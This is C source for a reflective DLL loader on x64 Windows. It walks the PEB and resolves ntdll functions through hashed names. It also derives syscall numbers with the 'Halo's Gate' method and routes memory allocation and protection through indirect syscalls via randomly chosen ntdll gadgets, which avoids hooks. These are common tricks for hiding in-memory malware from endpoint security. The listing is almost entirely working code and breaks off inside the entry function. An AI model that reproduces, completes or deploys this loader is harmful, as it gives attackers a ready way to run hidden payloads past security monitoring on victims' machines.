#include <windows.h>
#include <intrin.h>

/*
 * reflective_stub.c -- position-independent PE mapper.
 *
 * The host copies the whole DLL into a read/execute buffer (file layout) and
 * calls ReflectiveLoad at its file offset. Everything below therefore runs
 * without a mapped image, without an IAT, and without a CRT:
 *
 *   1. no global or static variables  (their .data offset differs per layout)
 *   2. no string literals             (MSVC promotes them to .rdata)
 *   3. no imported functions          (the IAT is not resolved yet)
 *   4. no CRT helpers                 (no memcpy/strlen/strcmp)
 *   5. no large switch statements     (jump tables live in .rdata)
 *
 * Rule 2 is enforced by hashing every module and export name at build time.
 * The only strings this code reads come from the target image's own export
 * table, which is valid mapped memory by definition.
 */

#define STUB_HASH_NTDLL            0x1EDAB0EDUL
#define STUB_HASH_NT_ALLOCATE      0xF783B8ECUL
#define STUB_HASH_NT_PROTECT       0x50E92888UL
#define STUB_HASH_LDR_LOAD_DLL     0x9E456A43UL
#define STUB_HASH_RTL_ADD_TABLE    0x81A887CEUL

#define STUB_MAX_SECTIONS      96
#define STUB_MAX_IMAGE_BYTES   0x10000000
#define STUB_MAX_HEADERS       0x10000
#define STUB_MAX_THUNKS        65536
#define STUB_FORWARD_DEPTH     8
#define STUB_MAX_NT_EXPORTS    512
#define STUB_MAX_GADGETS       64
#define STUB_SSN_SCAN          8
#define STUB_CURRENT_PROCESS   ((HANDLE)(LONG_PTR)-1)

/* Indirect syscall trampoline implemented in syscall_stub.asm. */
extern NTSTATUS StubIndirectSyscall(DWORD dwSsn, PVOID pGadget,
                                    ULONG_PTR a1, ULONG_PTR a2,
                                    ULONG_PTR a3, ULONG_PTR a4,
                                    ULONG_PTR a5, ULONG_PTR a6);

/* The SDK keeps PEB and LDR_DATA_TABLE_ENTRY opaque. These shadows mirror the
 * x64 layout up to BaseDllName; every field used here is before the unstable
 * tail of the structure. */
typedef struct _STUB_UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} STUB_UNICODE_STRING, *PSTUB_UNICODE_STRING;

typedef struct _STUB_PEB_LDR_DATA
{
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} STUB_PEB_LDR_DATA, *PSTUB_PEB_LDR_DATA;

typedef struct _STUB_LDR_ENTRY
{
    LIST_ENTRY           InLoadOrderLinks;
    LIST_ENTRY           InMemoryOrderLinks;
    LIST_ENTRY           InInitializationOrderLinks;
    PVOID                DllBase;
    PVOID                EntryPoint;
    ULONG                SizeOfImage;
    ULONG                Reserved;
    STUB_UNICODE_STRING  FullDllName;
    STUB_UNICODE_STRING  BaseDllName;
} STUB_LDR_ENTRY, *PSTUB_LDR_ENTRY;

typedef struct _STUB_PEB
{
    BYTE  Reserved[0x18];
    PVOID LoaderData;
} STUB_PEB, *PSTUB_PEB;

typedef NTSTATUS (NTAPI* PFN_LDR_LOAD_DLL)(PWSTR pSearchPath, PULONG pFlags,
                                           PSTUB_UNICODE_STRING pName, PHANDLE phModule);
typedef BOOLEAN (NTAPI* PFN_RTL_ADD_TABLE)(PRUNTIME_FUNCTION pTable, DWORD cEntries,
                                           ULONG_PTR ulBaseAddress);

typedef struct _STUB_CTX
{
    PFN_LDR_LOAD_DLL     pfnLoadDll;
    PFN_RTL_ADD_TABLE    pfnAddTable;
    DWORD                dwSsnProtect;
    PVOID                pGadget;
} STUB_CTX, *PSTUB_CTX;

/* ------------------------------------------------------------------ */
/* No-CRT primitives                                                   */
/* ------------------------------------------------------------------ */

static PVOID StubCopyMemory(PVOID pDestination, const VOID* pSource, SIZE_T cbSize)
{
    __movsb((PUCHAR)pDestination, (const UCHAR*)pSource, cbSize);
    return pDestination;
}

static VOID StubZeroMemory(PVOID pDestination, SIZE_T cbSize)
{
    __stosb((PUCHAR)pDestination, 0, cbSize);
}

static SIZE_T StubAlignUp(SIZE_T cbValue, SIZE_T cbAlign)
{
    return (cbValue + cbAlign - 1) & ~(cbAlign - 1);
}

static DWORD StubHashDjb2A(PCSTR szText)
{
    DWORD dwHash = 5381;

    while (*szText != 0)
    {
        CHAR ch = *szText++;
        if (ch >= 'a' && ch <= 'z') ch -= 32;
        dwHash = dwHash * 33 + (DWORD)(BYTE)ch;
    }
    return dwHash;
}

static DWORD StubHashWide(PCWSTR wszText, USHORT cchText)
{
    DWORD dwHash = 5381;
    USHORT i;

    for (i = 0; i < cchText; i++)
    {
        WCHAR wc = wszText[i];
        if (wc >= L'a' && wc <= L'z') wc -= 32;
        dwHash = dwHash * 33 + (DWORD)(wc & 0xFF);
    }
    return dwHash;
}

/* ------------------------------------------------------------------ */
/* PEB lookup                                                          */
/* ------------------------------------------------------------------ */

static PSTUB_PEB StubGetPeb(VOID)
{
    return (PSTUB_PEB)__readgsqword(0x60);
}

static HMODULE StubGetModuleByHash(DWORD dwNameHash)
{
    PSTUB_PEB         pPeb = StubGetPeb();
    PSTUB_PEB_LDR_DATA pLdr;
    PLIST_ENTRY       pHead;
    PLIST_ENTRY       pCurrent;

    if (pPeb == NULL || pPeb->LoaderData == NULL) return NULL;

    pLdr = (PSTUB_PEB_LDR_DATA)pPeb->LoaderData;
    pHead = &pLdr->InMemoryOrderModuleList;
    pCurrent = pHead->Flink;

    while (pCurrent != pHead)
    {
        PSTUB_LDR_ENTRY pEntry =
            CONTAINING_RECORD(pCurrent, STUB_LDR_ENTRY, InMemoryOrderLinks);

        if (pEntry->DllBase != NULL && pEntry->BaseDllName.Buffer != NULL &&
            StubHashWide(pEntry->BaseDllName.Buffer, pEntry->BaseDllName.Length / sizeof(WCHAR))
                == dwNameHash)
        {
            return (HMODULE)pEntry->DllBase;
        }

        pCurrent = pCurrent->Flink;
    }

    return NULL;
}

/* ------------------------------------------------------------------ */
/* Export lookup by hash (forwarders resolved recursively)             */
/* ------------------------------------------------------------------ */

static FARPROC StubGetExportByHash(HMODULE hModule, DWORD dwNameHash, PSTUB_CTX pCtx, INT nDepth);
static HMODULE StubLoadDll(PFN_LDR_LOAD_DLL pfnLoadDll, PCSTR szName);

static FARPROC StubResolveForwarder(HMODULE hModule, DWORD dwForwardRva, PSTUB_CTX pCtx, INT nDepth)
{
    PCSTR szForward = (PCSTR)((PBYTE)hModule + dwForwardRva);
    CHAR  szModule[64];
    SIZE_T i = 0;
    HMODULE hTarget;

    while (szForward[i] != 0 && szForward[i] != '.' && i < sizeof(szModule) - 1)
    {
        szModule[i] = szForward[i];
        i++;
    }
    szModule[i] = 0;

    if (szForward[i] != '.' || szForward[i + 1] == 0) return NULL;

    hTarget = StubGetModuleByHash(StubHashDjb2A(szModule));
    if (hTarget == NULL && pCtx != NULL && pCtx->pfnLoadDll != NULL)
    {
        hTarget = StubLoadDll(pCtx->pfnLoadDll, szModule);
    }
    if (hTarget == NULL) return NULL;

    return StubGetExportByHash(hTarget, StubHashDjb2A(szForward + i + 1), pCtx, nDepth + 1);
}

static FARPROC StubGetExportByHash(HMODULE hModule, DWORD dwNameHash, PSTUB_CTX pCtx, INT nDepth)
{
    PIMAGE_DOS_HEADER      pDos;
    PIMAGE_NT_HEADERS      pNt;
    PIMAGE_EXPORT_DIRECTORY pExport;
    DWORD                  dwExportRva;
    DWORD                  dwExportSize;
    PDWORD                 pdwNames;
    PDWORD                 pdwFunctions;
    PWORD                  pwOrdinals;
    DWORD                  i;

    if (hModule == NULL || nDepth > STUB_FORWARD_DEPTH) return NULL;

    pDos = (PIMAGE_DOS_HEADER)hModule;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    dwExportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    dwExportSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (dwExportRva == 0) return NULL;

    pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hModule + dwExportRva);
    pdwNames = (PDWORD)((PBYTE)hModule + pExport->AddressOfNames);
    pdwFunctions = (PDWORD)((PBYTE)hModule + pExport->AddressOfFunctions);
    pwOrdinals = (PWORD)((PBYTE)hModule + pExport->AddressOfNameOrdinals);

    for (i = 0; i < pExport->NumberOfNames; i++)
    {
        PCSTR szName = (PCSTR)((PBYTE)hModule + pdwNames[i]);
        DWORD dwFunctionRva;

        if (StubHashDjb2A(szName) != dwNameHash) continue;

        dwFunctionRva = pdwFunctions[pwOrdinals[i]];

        /* A function RVA inside the export directory is a forwarder string. */
        if (dwFunctionRva >= dwExportRva && dwFunctionRva < dwExportRva + dwExportSize)
        {
            return StubResolveForwarder(hModule, dwFunctionRva, pCtx, nDepth);
        }

        return (FARPROC)((PBYTE)hModule + dwFunctionRva);
    }

    return NULL;
}

/* ------------------------------------------------------------------ */
/* File-layout helpers                                                 */
/* ------------------------------------------------------------------ */

static PIMAGE_DOS_HEADER StubFindImageBase(PVOID pAnchor)
{
    ULONG_PTR ulAddress = (ULONG_PTR)pAnchor & ~(ULONG_PTR)0xFFF;
    INT       i;

    for (i = 0; i < 256; i++)
    {
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)(ulAddress - (ULONG_PTR)i * 0x1000);
        PIMAGE_NT_HEADERS pNt;

        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) continue;

        pNt = (PIMAGE_NT_HEADERS)((PBYTE)pDos + pDos->e_lfanew);
        if (pNt->Signature == IMAGE_NT_SIGNATURE) return pDos;
    }
    return NULL;
}

static BOOL StubValidateImage(PIMAGE_DOS_HEADER pDos)
{
    PIMAGE_NT_HEADERS     pNt;
    PIMAGE_SECTION_HEADER pSection;
    WORD                  i;

    if (pDos == NULL || pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    if (pDos->e_lfanew < 0 || pDos->e_lfanew > 0x1000) return FALSE;

    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pDos + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    if (pNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return FALSE;
    if (pNt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return FALSE;

    if (pNt->OptionalHeader.SizeOfImage < 0x1000 ||
        pNt->OptionalHeader.SizeOfImage > STUB_MAX_IMAGE_BYTES) return FALSE;
    if (pNt->OptionalHeader.SizeOfHeaders > STUB_MAX_HEADERS) return FALSE;
    if (pNt->FileHeader.NumberOfSections == 0 ||
        pNt->FileHeader.NumberOfSections > STUB_MAX_SECTIONS) return FALSE;

    pSection = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++)
    {
        SIZE_T cbSection = pSection[i].Misc.VirtualSize;
        if (pSection[i].SizeOfRawData > cbSection) cbSection = pSection[i].SizeOfRawData;

        if ((SIZE_T)pSection[i].VirtualAddress + cbSection > pNt->OptionalHeader.SizeOfImage)
        {
            return FALSE;
        }
        if (pSection[i].SizeOfRawData != 0 &&
            (SIZE_T)pSection[i].PointerToRawData + pSection[i].SizeOfRawData > STUB_MAX_IMAGE_BYTES)
        {
            return FALSE;
        }
    }

    return TRUE;
}

/* ------------------------------------------------------------------ */
/* Mapping stages                                                      */
/* ------------------------------------------------------------------ */

/* ------------------------------------------------------------------ */
/* Indirect syscalls: SSN resolution, gadget pool, generic trampoline   */
/* ------------------------------------------------------------------ */

static DWORD StubReadSsn(PBYTE pStub)
{
    if (pStub == NULL) return 0;

    /* mov r10, rcx ; mov eax, imm32 */
    if (pStub[0] == 0x4C && pStub[1] == 0x8B && pStub[2] == 0xD1 && pStub[3] == 0xB8)
    {
        return *(DWORD*)(pStub + 4);
    }
    return 0;
}

static DWORD StubCollectNtExports(PBYTE pNtdll, PBYTE* pArray, DWORD dwMax)
{
    PIMAGE_DOS_HEADER       pDos = (PIMAGE_DOS_HEADER)pNtdll;
    PIMAGE_NT_HEADERS       pNt;
    PIMAGE_EXPORT_DIRECTORY pExport;
    PDWORD                  pdwNames;
    PDWORD                  pdwFunctions;
    PWORD                   pwOrdinals;
    DWORD                   dwCount = 0;
    DWORD                   i;
    DWORD                   j;

    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    pNt = (PIMAGE_NT_HEADERS)(pNtdll + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;
    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) return 0;

    pExport = (PIMAGE_EXPORT_DIRECTORY)(pNtdll +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    pdwNames = (PDWORD)(pNtdll + pExport->AddressOfNames);
    pdwFunctions = (PDWORD)(pNtdll + pExport->AddressOfFunctions);
    pwOrdinals = (PWORD)(pNtdll + pExport->AddressOfNameOrdinals);

    for (i = 0; i < pExport->NumberOfNames && dwCount < dwMax; i++)
    {
        PCSTR szName = (PCSTR)(pNtdll + pdwNames[i]);

        if (szName[0] == 'N' && szName[1] == 't' &&
            szName[2] >= 'A' && szName[2] <= 'Z')
        {
            pArray[dwCount++] = pNtdll + pdwFunctions[pwOrdinals[i]];
        }
    }

    /* The neighbour walk relies on address order. */
    for (i = 1; i < dwCount; i++)
    {
        PBYTE pValue = pArray[i];
        j = i;
        while (j > 0 && pArray[j - 1] > pValue)
        {
            pArray[j] = pArray[j - 1];
            j--;
        }
        pArray[j] = pValue;
    }

    return dwCount;
}

static DWORD StubResolveSsn(PBYTE pNtdll, PVOID pTarget)
{
    PBYTE aExports[STUB_MAX_NT_EXPORTS];
    DWORD dwCount;
    DWORD dwIndex = 0;
    DWORD dwSsn;
    DWORD i;
    BOOL  bFound = FALSE;

    dwSsn = StubReadSsn((PBYTE)pTarget);
    if (dwSsn != 0) return dwSsn;

    dwCount = StubCollectNtExports(pNtdll, aExports, STUB_MAX_NT_EXPORTS);
    for (i = 0; i < dwCount; i++)
    {
        if (aExports[i] == (PBYTE)pTarget)
        {
            dwIndex = i;
            bFound = TRUE;
            break;
        }
    }
    if (!bFound) return 0;

    for (i = 1; i <= STUB_SSN_SCAN && dwIndex >= i; i++)
    {
        dwSsn = StubReadSsn(aExports[dwIndex - i]);
        if (dwSsn != 0) return dwSsn + i;
    }
    for (i = 1; i <= STUB_SSN_SCAN && dwIndex + i < dwCount; i++)
    {
        dwSsn = StubReadSsn(aExports[dwIndex + i]);
        if (dwSsn != 0) return dwSsn - i;
    }

    return 0;
}

static DWORD StubBuildGadgets(PBYTE pNtdll, PVOID* pPool, DWORD dwMax)
{
    PIMAGE_DOS_HEADER     pDos = (PIMAGE_DOS_HEADER)pNtdll;
    PIMAGE_NT_HEADERS     pNt;
    PIMAGE_SECTION_HEADER pSection;
    DWORD                 dwCount = 0;
    WORD                  s;

    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    pNt = (PIMAGE_NT_HEADERS)(pNtdll + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;

    pSection = IMAGE_FIRST_SECTION(pNt);
    for (s = 0; s < pNt->FileHeader.NumberOfSections && dwCount < dwMax; s++)
    {
        PBYTE pBytes;
        DWORD cbSection;
        DWORD i;

        if ((pSection[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0) continue;

        pBytes = pNtdll + pSection[s].VirtualAddress;
        cbSection = pSection[s].Misc.VirtualSize;

        for (i = 0; i + 2 < cbSection; i++)
        {
            if (pBytes[i] == 0x0F && pBytes[i + 1] == 0x05 && pBytes[i + 2] == 0xC3)
            {
                pPool[dwCount++] = pBytes + i;
                i += 2;
                if (dwCount >= dwMax) break;
            }
        }
    }

    return dwCount;
}

static NTSTATUS StubNtAllocate(DWORD dwSsn, PVOID pGadget, PVOID* ppBase,
                               SIZE_T* pcbSize, ULONG flType, ULONG flProtect)
{
    return StubIndirectSyscall(dwSsn, pGadget,
                               (ULONG_PTR)STUB_CURRENT_PROCESS,
                               (ULONG_PTR)ppBase,
                               0,
                               (ULONG_PTR)pcbSize,
                               flType,
                               flProtect);
}

static PVOID StubAllocate(DWORD dwSsn, PVOID pGadget, SIZE_T cbSize, ULONG_PTR ulPreferred)
{
    PVOID    pBase;
    SIZE_T   cbRegion;
    NTSTATUS status;

    /* Always ask for a base that differs from the preferred one so the
     * relocation pass is exercised on every load, not only after ASLR
     * collisions. Fall back to anywhere if the hint is taken. */
    pBase = (PVOID)(ulPreferred > 0x10000000
                        ? ulPreferred - 0x10000000
                        : ulPreferred + 0x10000000);
    cbRegion = cbSize;

    status = StubNtAllocate(dwSsn, pGadget, &pBase, &cbRegion,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status >= 0 && pBase != NULL) return pBase;

    pBase = NULL;
    cbRegion = cbSize;
    status = StubNtAllocate(dwSsn, pGadget, &pBase, &cbRegion,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status >= 0 && pBase != NULL) return pBase;

    return NULL;
}

static NTSTATUS StubNtProtect(DWORD dwSsn, PVOID pGadget, PVOID pAddress,
                              SIZE_T cbSize, ULONG flNewProtect, PULONG pflOldProtect)
{
    PVOID  pBase = pAddress;
    SIZE_T cbRegion = cbSize;

    return StubIndirectSyscall(dwSsn, pGadget,
                               (ULONG_PTR)STUB_CURRENT_PROCESS,
                               (ULONG_PTR)&pBase,
                               (ULONG_PTR)&cbRegion,
                               flNewProtect,
                               (ULONG_PTR)pflOldProtect,
                               0);
}

static HMODULE StubLoadDll(PFN_LDR_LOAD_DLL pfnLoadDll, PCSTR szName)
{
    WCHAR          awchName[128];
    STUB_UNICODE_STRING usName;
    HANDLE         hModule = NULL;
    DWORD          i = 0;

    while (szName[i] != 0 && i < 127)
    {
        awchName[i] = (WCHAR)(BYTE)szName[i];
        i++;
    }
    awchName[i] = 0;

    usName.Length = (USHORT)(i * sizeof(WCHAR));
    usName.MaximumLength = (USHORT)((i + 1) * sizeof(WCHAR));
    usName.Buffer = awchName;

    if (pfnLoadDll(NULL, NULL, &usName, &hModule) < 0) return NULL;
    return (HMODULE)hModule;
}

static BOOL StubCopyImage(PBYTE pMapped, PIMAGE_DOS_HEADER pDos, PIMAGE_NT_HEADERS pNt)
{
    PIMAGE_SECTION_HEADER pSection;
    WORD                  i;

    StubCopyMemory(pMapped, pDos, pNt->OptionalHeader.SizeOfHeaders);

    pSection = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++)
    {
        if (pSection[i].SizeOfRawData == 0) continue;
        if (pSection[i].PointerToRawData < pNt->OptionalHeader.SizeOfHeaders) continue;

        StubCopyMemory(pMapped + pSection[i].VirtualAddress,
                       (PBYTE)pDos + pSection[i].PointerToRawData,
                       pSection[i].SizeOfRawData);
    }

    return TRUE;
}

static BOOL StubRelocate(PBYTE pMapped, PIMAGE_NT_HEADERS pNt)
{
    ULONG_PTR ulDelta = (ULONG_PTR)pMapped - (ULONG_PTR)pNt->OptionalHeader.ImageBase;
    DWORD     dwRelocRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD     dwRelocSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    PIMAGE_BASE_RELOCATION pBlock;

    if (dwRelocRva == 0) return TRUE;
    if (dwRelocRva >= pNt->OptionalHeader.SizeOfImage) return FALSE;

    pBlock = (PIMAGE_BASE_RELOCATION)(pMapped + dwRelocRva);

    while (pBlock->VirtualAddress != 0)
    {
        DWORD cbBlock = pBlock->SizeOfBlock;
        DWORD cEntries;
        PWORD pwEntry;
        DWORD i;

        if (cbBlock < sizeof(IMAGE_BASE_RELOCATION)) return FALSE;
        if ((BYTE*)pBlock + cbBlock > pMapped + dwRelocRva + dwRelocSize) return FALSE;
        if (pBlock->VirtualAddress >= pNt->OptionalHeader.SizeOfImage) return FALSE;

        cEntries = (cbBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        pwEntry = (PWORD)(pBlock + 1);

        for (i = 0; i < cEntries; i++)
        {
            WORD  wType = (WORD)((pwEntry[i] >> 12) & 0xF);
            WORD  wOffset = (WORD)(pwEntry[i] & 0xFFF);
            PBYTE pbTarget = pMapped + pBlock->VirtualAddress + wOffset;

            if ((SIZE_T)(pbTarget - pMapped) + sizeof(ULONGLONG) > pNt->OptionalHeader.SizeOfImage)
            {
                return FALSE;
            }

            if (wType == IMAGE_REL_BASED_DIR64)
            {
                *(PULONGLONG)pbTarget += (ULONGLONG)ulDelta;
            }
            else if (wType == IMAGE_REL_BASED_ABSOLUTE)
            {
                /* padding */
            }
            else
            {
                return FALSE;
            }
        }

        pBlock = (PIMAGE_BASE_RELOCATION)((PBYTE)pBlock + cbBlock);
    }

    return TRUE;
}

static BOOL StubImports(PBYTE pMapped, PIMAGE_NT_HEADERS pNt, PSTUB_CTX pCtx)
{
    DWORD dwImportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD dwImportSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    PIMAGE_IMPORT_DESCRIPTOR pDescriptor;

    if (dwImportRva == 0) return TRUE;
    if (dwImportRva >= pNt->OptionalHeader.SizeOfImage) return FALSE;

    pDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pMapped + dwImportRva);

    while (pDescriptor->Name != 0)
    {
        PCSTR szModule = (PCSTR)(pMapped + pDescriptor->Name);
        HMODULE hModule;
        PIMAGE_THUNK_DATA pThunk;
        PIMAGE_THUNK_DATA pOriginal;
        DWORD cThunks = 0;

        if (pDescriptor->Name >= pNt->OptionalHeader.SizeOfImage) return FALSE;
        if ((BYTE*)pDescriptor >= pMapped + dwImportRva + dwImportSize) return FALSE;

        hModule = StubGetModuleByHash(StubHashDjb2A(szModule));
        if (hModule == NULL) hModule = StubLoadDll(pCtx->pfnLoadDll, szModule);
        if (hModule == NULL) return FALSE;

        pThunk = (PIMAGE_THUNK_DATA)(pMapped + pDescriptor->FirstThunk);
        pOriginal = pDescriptor->OriginalFirstThunk != 0
                        ? (PIMAGE_THUNK_DATA)(pMapped + pDescriptor->OriginalFirstThunk)
                        : pThunk;

        while (pOriginal->u1.AddressOfData != 0)
        {
            DWORD   dwNameHash;
            FARPROC pFunction;

            if (++cThunks > STUB_MAX_THUNKS) return FALSE;
            if ((SIZE_T)((BYTE*)pOriginal - pMapped) + sizeof(IMAGE_THUNK_DATA) >
                pNt->OptionalHeader.SizeOfImage) return FALSE;

            if ((pOriginal->u1.Ordinal & IMAGE_ORDINAL_FLAG64) != 0)
            {
                /* Ordinal imports are not resolved by hash; this loader only
                 * supports name imports, and says so instead of guessing. */
                return FALSE;
            }

            {
                PIMAGE_IMPORT_BY_NAME pName =
                    (PIMAGE_IMPORT_BY_NAME)(pMapped + pOriginal->u1.AddressOfData);
                dwNameHash = StubHashDjb2A((PCSTR)pName->Name);
            }

            pFunction = StubGetExportByHash(hModule, dwNameHash, pCtx, 0);
            if (pFunction == NULL) return FALSE;

            pThunk->u1.Function = (ULONG_PTR)pFunction;
            pOriginal++;
            pThunk++;
        }

        pDescriptor++;
    }

    return TRUE;
}

static BOOL StubRangeInImage(PBYTE pMapped, SIZE_T cbImage, ULONG_PTR ulAddress, SIZE_T cbLength)
{
    ULONG_PTR ulBase = (ULONG_PTR)pMapped;

    if (ulAddress < ulBase) return FALSE;
    if (ulAddress + cbLength < ulAddress) return FALSE;
    return (ulAddress + cbLength) <= (ulBase + cbImage);
}

static BOOL StubTlsCallbacks(PBYTE pMapped, PIMAGE_NT_HEADERS pNt)
{
    DWORD dwTlsRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    PIMAGE_TLS_DIRECTORY pTls;
    PIMAGE_TLS_CALLBACK* ppCallback;
    DWORD cCallbacks = 0;

    if (dwTlsRva == 0) return TRUE;
    if (dwTlsRva >= pNt->OptionalHeader.SizeOfImage) return FALSE;

    pTls = (PIMAGE_TLS_DIRECTORY)(pMapped + dwTlsRva);

    /* Static TLS needs a loader-managed index and a per-thread block. This
     * loader does not implement that, so refuse the module. */
    if (pTls->AddressOfIndex != 0) return FALSE;

    if (pTls->AddressOfCallBacks == 0) return TRUE;

    ppCallback = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks;
    while (ppCallback != NULL && *ppCallback != NULL && cCallbacks < 64)
    {
        if (!StubRangeInImage(pMapped, pNt->OptionalHeader.SizeOfImage,
                              (ULONG_PTR)ppCallback, sizeof(PVOID)))
        {
            return FALSE;
        }
        (*ppCallback)((PVOID)pMapped, DLL_PROCESS_ATTACH, NULL);
        ppCallback++;
        cCallbacks++;
    }

    return TRUE;
}

static BOOL StubRegisterExceptionTable(PBYTE pMapped, PIMAGE_NT_HEADERS pNt, PSTUB_CTX pCtx)
{
    DWORD dwRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    DWORD cbSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    DWORD cEntries;

    if (dwRva == 0 || cbSize < sizeof(RUNTIME_FUNCTION)) return TRUE;
    if ((SIZE_T)dwRva + cbSize > pNt->OptionalHeader.SizeOfImage) return FALSE;

    cEntries = cbSize / sizeof(RUNTIME_FUNCTION);
    if (pCtx->pfnAddTable((PRUNTIME_FUNCTION)(pMapped + dwRva),
                          cEntries, (ULONG_PTR)pMapped) == FALSE)
    {
        return FALSE;
    }

    return TRUE;
}

static BOOL StubProtectSections(PBYTE pMapped, PIMAGE_NT_HEADERS pNt, PSTUB_CTX pCtx)
{
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    DWORD                 dwOld = 0;
    WORD                  i;

    if (StubNtProtect(pCtx->dwSsnProtect, pCtx->pGadget, pMapped,
                      StubAlignUp(pNt->OptionalHeader.SizeOfHeaders, 0x1000),
                      PAGE_READONLY, &dwOld) < 0)
    {
        return FALSE;
    }

    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++)
    {
        SIZE_T cbSection = pSection[i].Misc.VirtualSize;
        DWORD  flCharacteristics = pSection[i].Characteristics;
        DWORD  flProtect;

        if (pSection[i].SizeOfRawData > cbSection) cbSection = pSection[i].SizeOfRawData;
        cbSection = StubAlignUp(cbSection, 0x1000);
        if (cbSection == 0) continue;

        if ((flCharacteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
            (flCharacteristics & IMAGE_SCN_MEM_WRITE) != 0)
        {
            return FALSE;   /* refuse writable+executable */
        }

        if ((flCharacteristics & IMAGE_SCN_MEM_EXECUTE) != 0)
            flProtect = PAGE_EXECUTE_READ;
        else if ((flCharacteristics & IMAGE_SCN_MEM_WRITE) != 0)
            flProtect = PAGE_READWRITE;
        else
            flProtect = PAGE_READONLY;

        if (StubNtProtect(pCtx->dwSsnProtect, pCtx->pGadget,
                          pMapped + pSection[i].VirtualAddress, cbSection,
                          flProtect, &dwOld) < 0)
        {
            return FALSE;
        }
    }

    return TRUE;
}

/* ------------------------------------------------------------------ */
/* Entry                                                               */
/* ------------------------------------------------------------------ */

__declspec(dllexport) PVOID WINAPI ReflectiveLoad(VOID)
{
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    STUB_CTX          ctx;
    HMODULE           hNtdll;
    PBYTE             pMapped;
    SIZE_T            cbImage;
    PVOID             pNtAllocate;
    PVOID             pNtProtect;
    PVOID             aGadgets[STUB_MAX_GADGETS];
    DWORD             cGadgets;
    DWORD             dwSsn;
    PVOID             pGadget;
    BOOL (WINAPI* pfnEntry)(HMODULE, DWORD, PVOID);

    pDos = StubFindImageBase((PVOID)(ULONG_PTR)&ReflectiveLoad);
    if (!StubValidateImage(pDos)) return NULL;

    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pDos + pDos->e_lfanew);

    hNtdll = StubGetModuleByHash(STUB_HASH_NTDLL);
    if (hNtdll == NULL) return NULL;

    StubZeroMemory(&ctx, sizeof(ctx));
    pNtAllocate = StubGetExportByHash(hNtdll, STUB_HASH_NT_ALLOCATE, NULL, 0);
    pNtProtect = StubGetExportByHash(hNtdll, STUB_HASH_NT_PROTECT, NULL, 0);
    ctx.pfnLoadDll = (PFN_LDR_LOAD_DLL)StubGetExportByHash(hNtdll, STUB_HASH_LDR_LOAD_DLL, NULL, 0);
    ctx.pfnAddTable = (PFN_RTL_ADD_TABLE)StubGetExportByHash(hNtdll, STUB_HASH_RTL_ADD_TABLE, NULL, 0);

    if (pNtAllocate == NULL || pNtProtect == NULL ||
        ctx.pfnLoadDll == NULL || ctx.pfnAddTable == NULL)
    {
        return NULL;
    }

    /* Resolve syscall numbers (Halo's Gate) and pick one syscall;ret gadget
     * from the pool. Allocation and protection never enter ntdll's stubs. */
    dwSsn = StubResolveSsn((PBYTE)hNtdll, pNtAllocate);
    if (dwSsn == 0) return NULL;

    ctx.dwSsnProtect = StubResolveSsn((PBYTE)hNtdll, pNtProtect);
    if (ctx.dwSsnProtect == 0) return NULL;

    cGadgets = StubBuildGadgets((PBYTE)hNtdll, aGadgets, STUB_MAX_GADGETS);
    if (cGadgets == 0) return NULL;
    pGadget = aGadgets[(DWORD)(__rdtsc() % cGadgets)];
    ctx.pGadget = pGadget;

